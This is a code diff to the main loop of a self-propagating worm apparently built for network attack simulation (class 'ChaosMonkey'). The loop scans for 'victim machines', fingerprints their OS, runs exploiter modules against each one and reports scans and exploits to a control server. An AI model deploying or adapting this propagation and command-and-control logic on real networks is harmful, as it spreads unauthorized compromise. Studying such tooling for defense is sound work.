@@ -2,10 +2,12 @@
 import sys
 import time
 import logging
+import platform
 from system_singleton import SystemSingleton
 from control import ControlClient
-from config import WormConfiguration
+from config import WormConfiguration, EXTERNAL_CONFIG_FILE
 from network.network_scanner import NetworkScanner
+import getopt
 
 __author__ = 'itamar'
 
@@ -26,6 +28,8 @@ class ChaosMonkey(object):
         self._exploited_machines = set()
         self._fail_exploitation_machines = set()
         self._singleton = SystemSingleton()
+        self._parent = None
+        self._args = args
 
     def initialize(self):
         LOG.info("WinWorm is initializing...")
@@ -33,27 +37,50 @@ class ChaosMonkey(object):
         if not self._singleton.try_lock():
             raise Exception("Another instance of the monkey is already running")
 
-        self._network = NetworkScanner()
-        self._network.initialize()
-        self._keep_running = True
-        self._exploiters = [exploiter() for exploiter in WormConfiguration.exploiter_classes]
-        self._dropper_path = sys.argv[0]
+        opts, self._args = getopt.getopt(self._args, "p:", ["parent="])
+        for op, val in opts:
+            if op in ("-p", "--parent"):
+                self._parent = val
+                break
 
-        new_config = ControlClient.get_control_config()
+        self._keep_running = True
+        self._network = NetworkScanner()
+        self._dropper_path = sys.argv[0]
+        self._os_type = platform.system().lower()
+        self._machine = platform.machine().lower()
+
+        ControlClient.wakeup(self._parent)
+        ControlClient.load_control_config()
+
 
     def start(self):
         LOG.info("WinWorm is running...")
 
         for _ in xrange(WormConfiguration.max_iterations):
-            new_config = ControlClient.get_control_config()
+            ControlClient.keepalive()
+            ControlClient.load_control_config()
 
-            if not self._keep_running:
+            self._network.initialize()
+
+            self._exploiters = [exploiter() for exploiter in WormConfiguration.exploiter_classes]
+
+            self._fingerprint = [fingerprint() for fingerprint in WormConfiguration.finger_classes]
+
+            if not self._keep_running or not WormConfiguration.alive:
                 break
 
             machines = self._network.get_victim_machines(WormConfiguration.scanner_class,
                                                          max_find=WormConfiguration.victims_max_find)
 
             for machine in machines:
+                for finger in self._fingerprint:
+                    LOG.info("Trying to get OS fingerprint from %r with module %s", 
+                             machine, finger.__class__.__name__)
+                    finger.get_host_fingerprint(machine)
+
+                ControlClient.send_telemetry('scan', {'machine': machine.as_dict(),
+                                                        'scanner' : WormConfiguration.scanner_class.__name__})                    
+
                 # skip machines that we've already exploited
                 if machine in self._exploited_machines:
                     LOG.debug("Skipping %r - already exploited",
@@ -66,11 +93,16 @@ class ChaosMonkey(object):
 
                 successful_exploiter = None
                 for exploiter in self._exploiters:
+                    if not exploiter.is_os_supported(machine):
+                        LOG.info("Skipping exploiter %s host:%r, os is not supported",
+                                 exploiter.__class__.__name__, machine)
+                        continue
+
                     LOG.info("Trying to exploit %r with exploiter %s...",
                              machine, exploiter.__class__.__name__)
 
                     try:
-                        if exploiter.exploit_host(machine, self._dropper_path):
+                        if exploiter.exploit_host(machine):
                             successful_exploiter = exploiter
                             break
                         else:
@@ -83,6 +115,8 @@ class ChaosMonkey(object):
 
                 if successful_exploiter:
                     self._exploited_machines.add(machine)
+                    ControlClient.send_telemetry('exploit', {'machine': machine.__dict__, 
+                                                             'exploiter': successful_exploiter.__class__.__name__})                    
 
                     LOG.info("Successfully propagated to %s using %s",
                              machine, successful_exploiter.__class__.__name__)
@@ -95,6 +129,7 @@ class ChaosMonkey(object):
                         break
                 else:
                     self._fail_exploitation_machines.add(machine)
+
 
             time.sleep(WormConfiguration.timeout_between_iterations)
 
